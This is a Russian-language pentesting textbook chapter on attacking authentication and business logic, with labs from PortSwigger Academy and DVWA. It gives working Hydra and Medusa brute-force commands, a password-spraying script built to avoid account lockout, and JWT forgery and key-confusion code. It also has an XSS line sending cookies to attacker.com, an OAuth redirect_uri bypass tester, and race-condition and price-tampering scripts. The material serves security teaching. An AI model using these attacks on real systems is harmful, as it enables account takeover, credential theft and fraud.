# Глава 11.4: Атаки на аутентификацию и бизнес-логику

## 🎯 Цели главы

К концу этой главы вы будете уметь:

- Проводить атаки брутфорс и password spraying с использованием Hydra, Medusa и Burp Intruder
- Понимать разницу между password spraying и credential stuffing и применять их
- Эксплуатировать уязвимости JWT: alg:none, key confusion, weak secret
- Атаковать session fixation и проводить session hijacking
- Находить и эксплуатировать OAuth 2.0 уязвимости
- Идентифицировать и эксплуатировать Business Logic Vulnerabilities
- Работать с лабораторными работами PortSwigger Academy

---

## 11.4.1 Слабые пароли и брутфорс

### Теоретическая основа

Брутфорс-атаки на аутентификацию делятся на несколько категорий в зависимости от стратегии:

```
КЛАССИФИКАЦИЯ АТАК НА АУТЕНТИФИКАЦИЮ:
========================================

1. PURE BRUTE FORCE
   Перебор всех возможных комбинаций символов
   Пример: aaa, aab, aac... zzz
   Медленно, но гарантированный результат
   Применимо только для коротких паролей / offline-атак

2. DICTIONARY ATTACK
   Использование списка реальных паролей
   Источники: RockYou, Have I Been Pwned, SecLists
   Быстро, покрывает 80%+ реальных пользователей

3. RULE-BASED ATTACK (гибридный)
   Словарь + правила мутации
   Пример: password → P@ssw0rd, p4ssword123, Password!
   Эффективен против "умных" пользователей

4. PASSWORD SPRAYING
   1 пароль × много пользователей
   Цель: обойти блокировку аккаунта
   "Умный" брутфорс

5. CREDENTIAL STUFFING
   Использование утечек (логин:пароль)
   Атака на повторное использование паролей
   Автоматизировано инструментами типа Sentry MBA
```

### Hydra: практическое использование

```bash
# Базовый синтаксис Hydra
hydra [опции] [цель] [сервис]

# ============================================================
# HTTP FORM POST (самый частый кейс в пентесте)
# ============================================================

# Сначала изучаем форму входа с Burp Suite:
# POST /login HTTP/1.1
# username=admin&password=test&_token=abc123
# Неверный пароль → "Invalid credentials"

hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  -s 80 192.168.1.100 http-post-form \
  "/login:username=^USER^&password=^PASS^:Invalid credentials" \
  -V -f -t 4

# Параметры:
# -l admin          — один логин
# -L users.txt      — список логинов
# -p password123    — один пароль
# -P rockyou.txt    — список паролей
# -s 80             — порт
# -V                — подробный вывод
# -f                — остановиться при первом успехе
# -t 4              — 4 параллельных потока (осторожно!)

# ============================================================
# SSH брутфорс
# ============================================================
hydra -L users.txt -P passwords.txt ssh://192.168.1.100

# С кастомным портом
hydra -l root -P /usr/share/wordlists/rockyou.txt \
  ssh://192.168.1.100:2222 -t 4

# ============================================================
# FTP
# ============================================================
hydra -l admin -P passwords.txt ftp://192.168.1.100

# ============================================================
# RDP
# ============================================================
hydra -L users.txt -P passwords.txt rdp://192.168.1.100 -t 1

# ============================================================
# HTTPS с CSRF-токеном (более сложный кейс)
# ============================================================
# Нужно два запроса: получить токен, затем отправить форму
# Лучше использовать Burp Intruder для таких кейсов

# ============================================================
# MySQL
# ============================================================
hydra -l root -P passwords.txt mysql://192.168.1.100

# ============================================================
# Генерация словарей с crunch
# ============================================================
# PIN из 4 цифр:
crunch 4 4 0123456789 -o pins.txt

# Пароли формата "Name + год":
crunch 8 10 -t Admin@@@@ -o year_passwords.txt

# ============================================================
# Топ списки паролей:
# ============================================================
# /usr/share/wordlists/rockyou.txt       — 14 миллионов
# /usr/share/seclists/Passwords/          — SecLists коллекция
# https://github.com/danielmiessler/SecLists
```

### Medusa: альтернатива Hydra

```bash
# Medusa — параллельный сетевой брутфорсер

# HTTP форма
medusa -h 192.168.1.100 -U users.txt -P passwords.txt \
  -M http -m DIR:/login -m FORM:username=&password= \
  -m DENY-SIGNAL:"Invalid credentials"

# SSH
medusa -h 192.168.1.100 -u admin -P rockyou.txt -M ssh

# SMB (Windows)
medusa -h 192.168.1.100 -U users.txt -P passwords.txt -M smbnt

# Когда использовать Medusa vs Hydra:
# Hydra:  HTTP формы, более широкая поддержка протоколов
# Medusa: Лучше для параллельных атак на несколько хостов
```

### Burp Suite Intruder: точечный брутфорс

```
BURP INTRUDER ДЛЯ БРУТФОРСА:
================================

1. Перехватить запрос логина в Proxy
2. Отправить в Intruder (Ctrl+I)
3. Очистить все маркеры (Clear §)
4. Выделить значение пароля → Add §
   POST /login HTTP/1.1
   username=admin&password=§test§

5. Выбрать тип атаки: Sniper
6. Payload Sets → Simple list → загрузить passwords.txt
7. Options → настроить фильтр:
   Grep - Match: "Invalid credentials" (для определения FP)
   Grep - Extract: для токенов/сессий
8. Start Attack

ОПТИМИЗАЦИЯ:
- Resource Pool: максимум 1 поток (избегаем блокировки)
- Throttle: 2000ms между запросами
- Redirect: следовать перенаправлениям
```

---

## 11.4.2 Password Spraying vs Credential Stuffing

### Password Spraying: детальный разбор

```python
#!/usr/bin/env python3
"""
Password Spraying Tool (только для авторизованного тестирования!)
Соблюдает lockout threshold во избежание блокировок.
"""

import requests
import time
import argparse
from datetime import datetime

def spray_passwords(target_url: str, userlist: list, 
                    passwords: list, delay: int = 30) -> list:
    """
    Проводит password spraying с задержкой между попытками.
    
    Стратегия: 1 пароль для всех пользователей → пауза →
               следующий пароль.
    Задержка предотвращает срабатывание lockout policy.
    """
    
    successful = []
    session = requests.Session()
    
    for password in passwords:
        print(f"\n[{datetime.now().strftime('%H:%M:%S')}] "
              f"Тестируем пароль: {password}")
        
        for username in userlist:
            try:
                response = session.post(
                    target_url,
                    data={'username': username, 'password': password},
                    timeout=10,
                    allow_redirects=False
                )
                
                # Признаки успеха (адаптировать под цель):
                # - 302 redirect (успешный вход → редирект на dashboard)
                # - Отсутствие слова "error" в ответе
                # - Изменение длины ответа
                
                if response.status_code == 302:
                    print(f"  [УСПЕХ!] {username}:{password}")
                    successful.append((username, password))
                elif "Invalid" not in response.text:
                    print(f"  [Возможно] {username}:{password} "
                          f"(статус: {response.status_code})")
                else:
                    print(f"  [ ] {username} - неверный пароль")
                    
            except requests.RequestException as e:
                print(f"  [ОШИБКА] {username}: {e}")
            
            time.sleep(1)  # Пауза между запросами
        
        # ВАЖНО: пауза между паролями во избежание lockout!
        print(f"\nОжидание {delay} секунд до следующего пароля...")
        time.sleep(delay)
    
    return successful

# Типичные "Spray" пароли для первого тестирования:
COMMON_SPRAY_PASSWORDS = [
    "Spring2024!",      # Сезон + год
    "Summer2024!",
    "Welcome1!",        # Классика
    "Password1!",
    "Company@2024",     # Название компании
    "January2024!",     # Месяц + год
    "Admin1234!",
    "Qwerty123!",
]

if __name__ == "__main__":
    # ТОЛЬКО ДЛЯ АВТОРИЗОВАННОГО ПЕНТЕСТА!
    users = ["alice", "bob", "carol", "admin", "john.smith"]
    
    results = spray_passwords(
        "http://testsite.local/login",
        users,
        COMMON_SPRAY_PASSWORDS[:2],  # Начать с 2 паролей
        delay=30  # 30 секунд между паролями
    )
    
    print(f"\n{'='*40}")
    print(f"Найдено комбинаций: {len(results)}")
    for user, pwd in results:
        print(f"  {user}:{pwd}")
```

### Credential Stuffing: использование утечек

```
CREDENTIAL STUFFING — ТЕОРИЯ:
================================

ОТКУДА БЕРУТСЯ БАЗЫ:
  Have I Been Pwned (haveibeenpwned.com)
  - 12+ миллиардов скомпрометированных аккаунтов
  - Можно проверить домен компании

  Публичные утечки:
  - Collection #1-5 (2019): 870 млн уникальных логинов
  - RockYou2024: новейший дамп
  - LinkedIn, Adobe, Yahoo утечки

ИНСТРУМЕНТЫ (для легального пентеста):
  - Sentry MBA (коммерческий)
  - SNIPR (Windows)
  - OpenBullet (open source)
  - ffuf / hydra с файлом комбо

ЗАЩИТА ОТ CREDENTIAL STUFFING:
  - MFA (многофакторная аутентификация)
  - Device fingerprinting
  - CAPTCHA на login-странице
  - IP rate limiting
  - Bot detection (Cloudflare, DataDome)
  - Мониторинг аномальных входов

ЧТО ИСКАТЬ КАК ПЕНТЕСТЕР:
  - Нет rate limiting на /login?
  - Нет CAPTCHA после N неудачных попыток?
  - Нет блокировки IP после X попыток?
  - Информативные сообщения об ошибках
    ("Пользователь не найден" vs "Неверный пароль")
    → User enumeration!
```

---

## 11.4.3 Уязвимости JWT: глубокий разбор

### Анатомия JWT

```
JWT (JSON Web Token) СТРУКТУРА:
=================================

eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6InVzZXIiLCJpYXQiOjE1MTYyMzkwMjJ9
.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c

ЧАСТЬ 1 — ЗАГОЛОВОК (Base64URL decoded):
{
  "alg": "HS256",   ← Алгоритм подписи
  "typ": "JWT"
}

ЧАСТЬ 2 — PAYLOAD (Base64URL decoded):
{
  "sub": "1234567890",     ← Subject (user ID)
  "role": "user",          ← Наши данные
  "iat": 1516239022        ← Issued At
}

ЧАСТЬ 3 — ПОДПИСЬ:
HMACSHA256(
  base64UrlEncode(header) + "." + base64UrlEncode(payload),
  secret_key
)

ИТОГ: header.payload.signature
```

### Атака 1: Algorithm None (alg: none)

```python
#!/usr/bin/env python3
"""
JWT alg:none attack demonstration
Уязвимость: сервер принимает токен без подписи
"""

import base64
import json

def b64url_encode(data: bytes) -> str:
    """Base64URL encode без padding."""
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

def b64url_decode(data: str) -> bytes:
    """Base64URL decode с добавлением padding."""
    padding = 4 - len(data) % 4
    if padding != 4:
        data += '=' * padding
    return base64.urlsafe_b64decode(data)

def forge_none_token(original_token: str, 
                     new_payload: dict) -> str:
    """
    Создаёт JWT с алгоритмом 'none' (без подписи).
    Если сервер уязвим — примет этот токен как валидный!
    """
    
    # Новый заголовок с alg: none
    # Попробуйте варианты: "none", "None", "NONE", "nOnE"
    header = {"alg": "none", "typ": "JWT"}
    
    header_encoded = b64url_encode(json.dumps(header, separators=(',', ':')).encode())
    payload_encoded = b64url_encode(json.dumps(new_payload, separators=(',', ':')).encode())
    
    # Без подписи (пустая третья часть)
    forged_token = f"{header_encoded}.{payload_encoded}."
    
    return forged_token


def decode_jwt(token: str) -> dict:
    """Декодирует JWT без верификации."""
    parts = token.split('.')
    if len(parts) != 3:
        raise ValueError("Неверный формат JWT")
    
    header = json.loads(b64url_decode(parts[0]))
    payload = json.loads(b64url_decode(parts[1]))
    
    return {'header': header, 'payload': payload}


# ДЕМОНСТРАЦИЯ АТАКИ:
if __name__ == "__main__":
    # Допустим, мы получили этот токен после логина как обычный user
    legitimate_token = (
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9"
        ".eyJ1c2VybmFtZSI6ImFsaWNlIiwicm9sZSI6InVzZXIifQ"
        ".SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
    )
    
    decoded = decode_jwt(legitimate_token)
    print("Оригинальный токен:")
    print(f"  Header:  {decoded['header']}")
    print(f"  Payload: {decoded['payload']}")
    
    # Модифицируем payload: user → admin
    malicious_payload = {
        "username": "alice",
        "role": "admin"   # Эскалация привилегий!
    }
    
    forged = forge_none_token(legitimate_token, malicious_payload)
    print(f"\nПодделанный токен (alg:none):")
    print(forged)
    print("\nЕсли сервер принял его — уязвимость подтверждена!")
```

### Атака 2: Слабый секрет (JWT Cracking)

```bash
# Брутфорс секрета JWT с помощью hashcat
# Формат JWT hashcat: $jwt$<algorithm>$<token>

# Сохраняем токен в файл
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c" > jwt.txt

# hashcat mode 16500 = JWT
hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt

# john the ripper
john --wordlist=/usr/share/wordlists/rockyou.txt jwt.txt --format=HMAC-SHA256

# jwt_tool — специализированный инструмент
git clone https://github.com/ticarpi/jwt_tool
cd jwt_tool

# Базовая проверка токена
python3 jwt_tool.py <token>

# Сканирование на все уязвимости
python3 jwt_tool.py <token> -t https://target.com/api -rc "Cookie: session=<token>" -M at

# Атака alg:none
python3 jwt_tool.py <token> -X a

# Брутфорс секрета
python3 jwt_tool.py <token> -C -d /usr/share/wordlists/rockyou.txt

# Атака RS256→HS256 (key confusion)
python3 jwt_tool.py <token> -X k -pk public_key.pem
```

### Атака 3: RS256 → HS256 Key Confusion

```python
#!/usr/bin/env python3
"""
JWT Algorithm Confusion Attack: RS256 → HS256
Если сервер использует RSA (публичный/приватный ключ),
мы можем попробовать использовать публичный ключ как HMAC-секрет.

Условия успеха:
1. Сервер использует RS256 для подписи
2. Мы можем получить публичный ключ (часто доступен в /jwks.json)
3. Сервер не проверяет жёстко алгоритм (принимает оба)
"""

import jwt  # pip install PyJWT
import requests

def key_confusion_attack(token: str, public_key: str) -> str:
    """
    Создаёт подделанный HS256 токен, используя публичный ключ RSA
    как HMAC-секрет.
    """
    
    # Декодируем оригинальный payload (без верификации)
    original_payload = jwt.decode(
        token, 
        options={"verify_signature": False}
    )
    
    print(f"Оригинальный payload: {original_payload}")
    
    # Изменяем роль
    original_payload['role'] = 'admin'
    original_payload['sub'] = '1'  # Часто ID=1 = первый admin
    
    # Подписываем публичным ключом как HS256 секретом
    # Важно: ключ нужно передать в bytes
    forged_token = jwt.encode(
        original_payload,
        public_key.encode(),  # Публичный ключ как секрет!
        algorithm="HS256"
    )
    
    return forged_token


def get_public_key_from_jwks(target_url: str) -> str:
    """Получает публичный ключ из JWKS endpoint."""
    
    jwks_url = f"{target_url}/.well-known/jwks.json"
    
    try:
        response = requests.get(jwks_url)
        jwks = response.json()
        
        # Извлекаем первый ключ
        key_data = jwks['keys'][0]
        print(f"Найден ключ: {key_data}")
        
        # Конвертируем в PEM формат
        from jwt.algorithms import RSAAlgorithm
        public_key = RSAAlgorithm.from_jwk(key_data)
        return public_key.public_key_bytes().decode()
        
    except Exception as e:
        print(f"Ошибка получения JWKS: {e}")
        return None
```

---

## 11.4.4 Session Fixation и Session Hijacking

### Session Fixation: теория и практика

```
SESSION FIXATION — КАК РАБОТАЕТ:
===================================

НОРМАЛЬНЫЙ ПОТОК АУТЕНТИФИКАЦИИ:
Пользователь → Сервер: GET /login
Сервер → Пользователь: Set-Cookie: session=RANDOM_NEW_SESSION
Пользователь → Сервер: POST /login (с кредами + RANDOM_NEW_SESSION)
Сервер → Пользователь: 200 OK (RANDOM_NEW_SESSION теперь аутентифицирован)

УЯЗВИМЫЙ ПОТОК (Session Fixation):
1. Атакующий → Сервер: GET /login
   Сервер → Атакующий: Set-Cookie: session=ATTACKER_SESSION

2. Атакующий → Жертва: <a href="http://site.com/login?session=ATTACKER_SESSION">
   ИЛИ инъекция в HTML, XSS, email с ссылкой

3. Жертва → Сервер: POST /login (с ATTACKER_SESSION)
   Сервер: аутентифицирует ATTACKER_SESSION с правами жертвы!

4. Атакующий использует ATTACKER_SESSION → имеет доступ как жертва!

ЗАЩИТА: При успешном логине всегда регенерировать session ID!
PHP: session_regenerate_id(true);
```

```php
<?php
// Уязвимый код (не регенерирует сессию):
session_start();
if (check_credentials($_POST['user'], $_POST['pass'])) {
    $_SESSION['user'] = $_POST['user'];
    $_SESSION['logged_in'] = true;
    // ПРОБЛЕМА: session ID остался прежним!
}

// ЗАЩИЩЁННЫЙ код:
session_start();
if (check_credentials($_POST['user'], $_POST['pass'])) {
    // Регенерировать session ID при логине!
    session_regenerate_id(true);  // true = удалить старую сессию
    $_SESSION['user'] = $_POST['user'];
    $_SESSION['logged_in'] = true;
}
?>
```

### Session Hijacking: методы кражи сессии

```
МЕТОДЫ КРАЖИ SESSION:
=======================

1. XSS → кража cookie
   <script>
   document.location='http://attacker.com/steal?c='+document.cookie
   </script>
   Защита: HttpOnly flag на cookie

2. Network Sniffing (если не HTTPS)
   Wireshark → фильтр: http contains "Cookie:"
   Защита: HTTPS everywhere + Secure flag на cookie

3. Session Fixation (см. выше)
   Защита: session_regenerate_id()

4. Предсказуемые Session ID
   Если ID = MD5(timestamp) или sequential ID
   Атакующий может угадать/перебрать
   Защита: криптографически случайные ID (128+ бит)

5. Logfile disclosure
   Если session ID попадает в URL → логи → disclosure
   Не передавать session ID в GET-параметрах!
   /dashboard?session=abc123 ← ПЛОХО
```

```python
# Проверка предсказуемости session ID
import requests
import hashlib
from datetime import datetime

def check_session_predictability(target: str, samples: int = 10) -> None:
    """Анализирует предсказуемость session ID."""
    
    sessions = []
    
    for i in range(samples):
        response = requests.get(target)
        
        # Попробуем разные источники session ID
        for cookie_name in ['session', 'PHPSESSID', 'JSESSIONID', 'ASP.NET_SessionId']:
            if cookie_name in response.cookies:
                session_id = response.cookies[cookie_name]
                sessions.append(session_id)
                print(f"Session {i+1}: {session_id} (len={len(session_id)})")
    
    if len(sessions) > 1:
        # Проверяем длину и entropy
        lengths = set(len(s) for s in sessions)
        print(f"\nДлины session ID: {lengths}")
        
        # Проверяем на числовые последовательности
        try:
            numeric_ids = [int(s) for s in sessions]
            diffs = [numeric_ids[i+1] - numeric_ids[i] for i in range(len(numeric_ids)-1)]
            if len(set(diffs)) == 1:
                print("КРИТИЧЕСКАЯ УЯЗВИМОСТЬ: Sequential session ID!")
        except ValueError:
            pass
        
        print(f"\nАнализ завершён. Если ID похожи — возможна предсказуемость.")
```

---

## 11.4.5 OAuth 2.0 уязвимости

### Схема OAuth 2.0

```
OAUTH 2.0 AUTHORIZATION CODE FLOW:
=====================================

Пользователь    Клиент (App)     Auth Server    Resource Server
    |               |                |                |
    |--вход на app->|                |                |
    |               |--redirect ---->|                |
    |               |  client_id     |                |
    |               |  redirect_uri  |                |
    |               |  scope         |                |
    |               |  state=random  |                |
    |<--login page--|                |                |
    |--credentials->|                |                |
    |               |<--auth code----|                |
    |               |                |                |
    |               |--code + secret>|                |
    |               |<--access token-|                |
    |               |                                 |
    |               |----------access token---------->|
    |               |<---------user data--------------|

УЯЗВИМЫЕ ПАРАМЕТРЫ:
  redirect_uri  — куда вернётся код
  state         — CSRF-защита
  scope         — запрашиваемые права
  client_secret — должен быть СЕРВЕРНЫМ
```

### Атака 1: Open Redirect через redirect_uri

```
АТАКА OPEN REDIRECT:
======================

Нормальный redirect_uri:
https://app.com/callback?code=AUTH_CODE

Атака: изменяем redirect_uri на сайт атакующего:
https://oauth-server.com/authorize?
  client_id=app123&
  redirect_uri=https://attacker.com/steal&  ← ИЗМЕНЁН!
  response_type=code&
  scope=profile email

Если сервер уязвим → auth code отправится на attacker.com!
Атакующий обменивает код на access token.

ВАРИАНТЫ ОБХОДА WHITELIST:
  https://app.com.attacker.com/callback    (subdomain trick)
  https://app.com@attacker.com/callback    (@ trick)
  https://app.com/callback/../../../evil   (path traversal)
  https://attacker.com?x=https://app.com  (open redirect chain)
```

```python
#!/usr/bin/env python3
"""Тест OAuth redirect_uri уязвимостей."""

import requests
from urllib.parse import urlencode, urlparse, parse_qs

def test_oauth_redirect_uri(auth_url: str, client_id: str, 
                             legitimate_redirect: str) -> None:
    """Тестирует различные варианты redirect_uri обхода."""
    
    parsed = urlparse(legitimate_redirect)
    base_domain = parsed.netloc
    
    payloads = [
        # Open redirect
        f"https://attacker.com/callback",
        # Subdomain
        f"https://{base_domain}.attacker.com/callback",
        # Path traversal  
        f"{legitimate_redirect}/../../../attacker.com",
        # @ trick
        f"https://attacker.com@{base_domain}/callback",
        # Extra param
        f"{legitimate_redirect}?extra=https://attacker.com",
        # Fragment
        f"https://attacker.com#{legitimate_redirect}",
    ]
    
    print(f"Тестируем OAuth redirect_uri bypass для: {auth_url}")
    print(f"Легитимный redirect: {legitimate_redirect}\n")
    
    for payload in payloads:
        params = {
            'client_id': client_id,
            'redirect_uri': payload,
            'response_type': 'code',
            'scope': 'profile',
            'state': 'test123'
        }
        
        try:
            response = requests.get(
                auth_url, 
                params=params,
                allow_redirects=False,
                timeout=10
            )
            
            location = response.headers.get('Location', '')
            status = response.status_code
            
            print(f"Payload: {payload[:60]}...")
            print(f"  Status: {status}")
            if status in [301, 302]:
                print(f"  Location: {location[:80]}")
                if 'attacker.com' in location:
                    print(f"  *** УЯЗВИМОСТЬ НАЙДЕНА! ***")
            print()
            
        except Exception as e:
            print(f"  Ошибка: {e}")


def check_state_parameter(auth_url: str) -> None:
    """Проверяет наличие CSRF-защиты через state параметр."""
    
    print("Проверяем CSRF через state parameter...")
    
    # Запрос без state
    params = {
        'client_id': 'test',
        'redirect_uri': 'https://app.com/callback',
        'response_type': 'code',
        'scope': 'profile'
        # state отсутствует!
    }
    
    response = requests.get(auth_url, params=params, 
                            allow_redirects=False, timeout=10)
    
    if response.status_code in [301, 302]:
        print("  Сервер принял запрос без state — возможна CSRF-уязвимость!")
    else:
        print("  Сервер отклонил запрос без state — CSRF-защита работает")
```

### Атака 2: Token Leakage через Referrer

```
TOKEN LEAKAGE ЧЕРЕЗ REFERRER:
================================

Сценарий:
1. OAuth callback возвращает token в URL:
   https://app.com/callback#access_token=TOKEN123&...
   ИЛИ
   https://app.com/callback?code=CODE123

2. Страница callback загружает внешний ресурс:
   <script src="https://analytics.com/track.js"></script>
   <img src="https://tracking.com/pixel.png">

3. Браузер отправляет Referer с полным URL, включая token!
   GET /track.js HTTP/1.1
   Referer: https://app.com/callback#access_token=TOKEN123

ЗАЩИТА:
  - Не передавать tokens в URL (использовать POST)
  - meta referrer-policy: no-referrer
  - Убрать внешние ресурсы со страницы callback
  - Использовать PKCE для public clients
```

---

## 11.4.6 Business Logic Vulnerabilities

### Что такое BLV и почему они особые

```
БИЗНЕС-ЛОГИЧЕСКИЕ УЯЗВИМОСТИ vs ТЕХНИЧЕСКИЕ:
===============================================

Технические уязвимости (SQL Injection, XSS):
  - Обнаруживаются автоматическими сканерами
  - Имеют чёткие паттерны
  - Не зависят от бизнес-контекста

Бизнес-логические уязвимости:
  - Сканеры НЕ найдут
  - Требуют понимания бизнес-процессов
  - "Код работает корректно, но логика неправильная"
  - Часто специфичны для конкретного приложения

ПРИМЕРЫ BLV:
  - Купон на -100% скидку (магазин)
  - Перевод отрицательной суммы (банк)
  - Смена чужого пароля через reset flow
  - Race condition при списании средств
  - Пропуск шагов в многоэтапном процессе
```

### BLV 1: Неверная проверка купонов

```python
# УЯЗВИМЫЙ КОД (PHP-пример, типичная ошибка):
# Применение купона без проверки применения к заказу

# Атака: изменить сумму скидки или применить один купон несколько раз

# Базовый тест: применить купон → не оформить заказ →
# вернуться и применить тот же купон снова

import requests

def test_coupon_reuse(session: requests.Session, 
                      base_url: str, coupon: str) -> None:
    """Тест на повторное использование купона."""
    
    print(f"Тестируем купон: {coupon}")
    
    results = []
    for attempt in range(3):
        # Добавить товар в корзину
        session.post(f"{base_url}/cart/add", 
                    data={"product_id": 1, "qty": 1})
        
        # Применить купон
        resp = session.post(f"{base_url}/cart/coupon",
                           data={"code": coupon})
        
        data = resp.json() if resp.headers.get('content-type', '').startswith('application/json') else {}
        discount = data.get('discount', 0)
        
        results.append({
            'attempt': attempt + 1,
            'status': resp.status_code,
            'discount': discount,
            'response': resp.text[:100]
        })
        
        print(f"  Попытка {attempt+1}: статус={resp.status_code}, скидка={discount}")
    
    # Если все попытки успешны — уязвимость найдена
    successful = sum(1 for r in results if r['status'] == 200 and r['discount'] > 0)
    if successful > 1:
        print(f"  УЯЗВИМОСТЬ: Купон применён {successful} раза!")


def test_negative_quantity(session: requests.Session, base_url: str) -> None:
    """Тест на отрицательное количество товара (инвертирование оплаты)."""
    
    # Добавить товар с отрицательным количеством
    resp = session.post(f"{base_url}/cart/add",
                       data={"product_id": 1, "qty": -1})
    
    print(f"Отрицательное количество: {resp.status_code}")
    print(f"Ответ: {resp.text[:200]}")
    
    # Проверяем итоговую сумму корзины
    cart_resp = session.get(f"{base_url}/cart")
    print(f"Корзина после атаки: {cart_resp.text[:300]}")


def test_price_manipulation(session: requests.Session, 
                            base_url: str) -> None:
    """Тест на подмену цены в запросе."""
    
    # Перехватываем запрос оформления заказа
    # Если цена передаётся в POST-параметре — это уязвимость
    
    resp = session.post(f"{base_url}/checkout",
                       data={
                           "product_id": 1,
                           "qty": 1,
                           "price": "0.01",    # Подменяем цену!
                           "total": "0.01"
                       })
    
    print(f"Подмена цены: {resp.status_code}")
    if "success" in resp.text.lower() or resp.status_code in [200, 302]:
        print("  КРИТИЧЕСКАЯ УЯЗВИМОСТЬ: цена принята из запроса!")
```

### BLV 2: Race Conditions

```python
#!/usr/bin/env python3
"""
Race Condition Attack — демонстрация.

Сценарий: Система начисляет бонусные баллы за первый заказ.
Атака: Отправить 2 запроса одновременно → получить бонус дважды!
"""

import threading
import requests
import time

def make_order(session_cookies: dict, order_id: int, 
               results: list, lock: threading.Lock) -> None:
    """Выполняет заказ в рамках отдельного потока."""
    
    session = requests.Session()
    session.cookies.update(session_cookies)
    
    try:
        response = session.post(
            "http://target.com/api/order/complete",
            json={"order_id": order_id},
            timeout=5
        )
        
        with lock:
            results.append({
                'thread': threading.current_thread().name,
                'status': response.status_code,
                'response': response.text[:100],
                'time': time.time()
            })
    
    except Exception as e:
        with lock:
            results.append({'error': str(e)})


def race_condition_attack(cookies: dict, order_id: int, 
                           threads: int = 10) -> None:
    """
    Запускает несколько параллельных запросов для эксплуатации
    race condition.
    """
    
    results = []
    lock = threading.Lock()
    thread_list = []
    
    print(f"Запускаем {threads} параллельных запросов...")
    
    # Создаём потоки
    for i in range(threads):
        t = threading.Thread(
            target=make_order,
            args=(cookies, order_id, results, lock),
            name=f"Thread-{i+1}"
        )
        thread_list.append(t)
    
    # Запускаем все почти одновременно
    start_time = time.time()
    for t in thread_list:
        t.start()
    
    for t in thread_list:
        t.join()
    
    end_time = time.time()
    
    # Анализируем результаты
    print(f"\nВыполнено за {end_time - start_time:.3f}с")
    print(f"Успешных ответов: {sum(1 for r in results if r.get('status') == 200)}")
    
    for r in results:
        if 'error' not in r:
            print(f"  {r['thread']}: {r['status']} — {r['response']}")

# Более современный подход: HTTP/2 single-packet attack
# с использованием Burp Suite Turbo Intruder или requests-h2
```

### BLV 3: Пропуск шагов в многоэтапном процессе

```
МНОГОЭТАПНЫЕ ПРОЦЕССЫ — ТЕСТИРОВАНИЕ:
========================================

Типичный пример: Оформление заказа
  Шаг 1: /cart/view        (просмотр корзины)
  Шаг 2: /checkout/address  (ввод адреса)
  Шаг 3: /checkout/shipping  (выбор доставки)
  Шаг 4: /checkout/payment   (оплата)
  Шаг 5: /order/confirm     (подтверждение)

АТАКИ:
  1. Пропуск платёжного шага:
     GET /order/confirm напрямую без /checkout/payment
     → Возможен заказ без оплаты

  2. Изменение порядка шагов:
     Перейти к шагу 5 → назад к шагу 3 → изменить товар →
     снова к шагу 5 → возможна оплата по старой (меньшей) цене

  3. Повтор шага:
     /checkout/coupon применить купон → вернуться назад →
     снова /checkout/coupon → двойная скидка?

Что проверять в Burp:
  - Запросы каждого шага (что в POST-теле?)
  - Нет ли client-side validation без server-side?
  - Можно ли напрямую GET/POST конечный URL?
  - Что происходит при изменении sequence?
```

---

## 11.4.7 Методология тестирования аутентификации

### Чеклист тестирования

```
ЧЕКЛИСТ ТЕСТИРОВАНИЯ АУТЕНТИФИКАЦИИ:
======================================

БАЗОВЫЕ ПРОВЕРКИ:
  [ ] User enumeration (разные сообщения для несущ./несовп. пароля)
  [ ] Rate limiting на /login (нет блокировки после N попыток?)
  [ ] Account lockout policy
  [ ] Password complexity requirements
  [ ] "Remember me" токен — хранение, срок действия
  [ ] Logout — действительно ли инвалидируется сессия?

SESSION MANAGEMENT:
  [ ] Session ID в URL (нет ли?)
  [ ] Длина и случайность session ID
  [ ] Session regeneration при логине
  [ ] Session expiration
  [ ] Multiple concurrent sessions
  [ ] Cookie flags: HttpOnly, Secure, SameSite

PASSWORD RESET:
  [ ] Reset token — срок действия
  [ ] Reset token — одноразовость
  [ ] Reset token в URL → Referer leak
  [ ] Host header injection в reset email
  [ ] Предсказуемость reset token

JWT:
  [ ] Algorithm: none attack
  [ ] Weak secret (cracking)
  [ ] Algorithm confusion (RS256 → HS256)
  [ ] JWT в URL vs Cookie (info disclosure)

OAUTH:
  [ ] redirect_uri whitelist bypass
  [ ] state parameter CSRF check
  [ ] Token leakage через Referer
  [ ] Scope validation
  [ ] Client secret exposure в JS
```

---

## Практические упражнения

### Упражнение 1: PortSwigger Academy — Authentication Labs

Перейдите на portswigger.net/web-security/authentication и выполните:

```
РЕКОМЕНДОВАННЫЕ ЛАБОРАТОРНЫЕ РАБОТЫ (по порядку):
===================================================

УРОВЕНЬ: ПРАКТИК
  1. "Username enumeration via different responses"
     Цель: найти валидный username по разным сообщениям об ошибке
     
  2. "Password reset broken logic"
     Цель: обойти token reset и захватить аккаунт admin
  
  3. "Brute-forcing a stay-logged-in cookie"
     Цель: декодировать и брутфорснуть "remember me" cookie

УРОВЕНЬ: ЭКСПЕРТ
  4. "Broken brute-force protection, IP block"
     Цель: обойти блокировку IP при брутфорсе
     Подсказка: Вход от своего имени сбрасывает счётчик попыток

  5. "2FA bypass using a brute-force attack"
     Цель: обойти TOTP двухфакторку

ДЛЯ JWT:
  6. "JWT authentication bypass via unverified signature"
  7. "JWT authentication bypass via algorithm confusion"
  8. "JWT authentication bypass via weak signing key"
```

### Упражнение 2: DVWA — Brute Force модуль

```bash
# Запустить DVWA через Docker
docker run --rm -d -p 80:80 vulnerables/web-dvwa

# Настройка: Admin / password → Security Level: Low → Medium → High

# Задача 1 (Low): использовать Hydra для брутфорса формы DVWA
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  -s 80 127.0.0.1 http-get-form \
  "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:incorrect" \
  -V -f

# Задача 2 (Medium): добавляется задержка — обойти с помощью Intruder

# Задача 3 (High): добавляется CSRF-токен
# Нужен Burp Turbo Intruder с двойным запросом:
# 1. GET для получения токена
